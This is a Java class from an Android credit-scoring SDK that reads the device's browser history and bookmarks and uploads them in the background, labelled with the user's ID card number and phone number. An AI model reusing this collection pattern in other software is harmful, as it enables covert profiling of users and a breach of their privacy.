package com.yxjr.credit.grab;

import java.text.SimpleDateFormat;
import java.util.Date;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.yxjr.credit.constants.HttpConstant;
import com.yxjr.credit.constants.SpConstant;
import com.yxjr.credit.http.manage.NoConfineAsyncTask;
import com.yxjr.credit.log.YxLog;
import com.yxjr.credit.util.YxCommonUtil;
import com.yxjr.credit.util.YxStoreUtil;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;

public class BrowserHistoryGrab extends Grab {

	private Context mContext;

	public BrowserHistoryGrab(Context context) {
		this.mContext = context;
	}

	@SuppressLint("SimpleDateFormat")
	@Override
	public JSONArray getData(String time) {
		String selection = null;
		if (YxCommonUtil.isNotBlank(time)) {
			long record = YxCommonUtil.dateStringToLong(time);
			selection = " date >'" + record + "'";//查询条件
		}
		Cursor browserHistoryCursor = null;
		JSONArray browserHistoryInfo = new JSONArray();
		try {
			String[] projection = new String[] { "title", "url", "date" };
			//	browserHistoryCursor = mContext.getContentResolver().query(Browser.BOOKMARKS, projection, selection, null, "date desc");
			//	browserHistoryCursor = mContext.getContentResolver().query(Browser.BOOKMARKS_URI, projection, selection, null, "date desc");
			browserHistoryCursor = mContext.getContentResolver().query(Uri.parse("content://browser/bookmarks"), projection, selection, null, "date desc");
			if (browserHistoryCursor != null && browserHistoryCursor.moveToFirst()) {
				do {
					String webUrl = browserHistoryCursor.getString(browserHistoryCursor.getColumnIndex("url"));
					String webTitle = browserHistoryCursor.getString(browserHistoryCursor.getColumnIndex("title"));
					String date = browserHistoryCursor.getString(browserHistoryCursor.getColumnIndex("date"));
					String browerTime = null;
					if (date != null) {
						browerTime = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(Long.parseLong(date)));
					}
					JSONObject browserHistory = new JSONObject();
					browserHistory.put("webUrl", subStringByByte(webUrl,1024));
					browserHistory.put("webTitle", subStringByByte(webTitle,150));
					browserHistory.put("browserTime", subStringByByte(browerTime,20));
					browserHistoryInfo.put(browserHistory);
				} while (browserHistoryCursor.moveToNext());
				if (browserHistoryCursor != null) {
					browserHistoryCursor.close();
				}
			}
		} catch (SQLiteException ex) {
			YxLog.e("SQLiteException:" + ex);
			ex.printStackTrace();
		} catch (SecurityException se) {
			// TODO: handle exception
			YxLog.e("SecurityException: permission android.permission.READ_HISTORY_BOOKMARKS" + se);
		} catch (Exception e) {
			// TODO: handle exception
			YxLog.e("Exception:" + e);
			e.printStackTrace();
		} finally {
			if (null != browserHistoryCursor) {
				browserHistoryCursor.close();
			}
		}
		return browserHistoryInfo;
	}

	@Override
	public void upload() {
		new Task().execute();
	}

	private class Task extends NoConfineAsyncTask<String, String, String> {
		@Override
		protected String doInBackground(String... params) {
			try {
				int interval = getInterval(mContext, SpConstant.BSQ);
				String wsTime = getLastTime(mContext, SpConstant.B_LASTTIME);
				boolean surpass = isSurpass(mContext, SpConstant.B_IS);
				if (interval != 0 && surpass) {
					JSONArray browserHistoryArray = getData(wsTime);
					if (null != browserHistoryArray) {
						final String idCard = YxStoreUtil.get(mContext, SpConstant.PARTNER_ID_CARD_NUM);
						final String phoneNo = YxStoreUtil.get(mContext, SpConstant.PARTNER_PHONENUMBER);
						batchJSONArray(browserHistoryArray, interval, new OnBatchListener() {

							@Override
							public void onBatch(JSONArray array) {
								try {
									JSONObject browserHistoryInfo = new JSONObject();
									browserHistoryInfo.put("cert", idCard);
									browserHistoryInfo.put("mobileNo", phoneNo);
									browserHistoryInfo.put("browserHistoryInfo", array);
									sendServer(mContext, HttpConstant.Request.SEND_BROWSER_HISTORY, browserHistoryInfo);
								} catch (JSONException e) {
									e.printStackTrace();
								}
							}
						});
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
			return "";
		}
	}

}
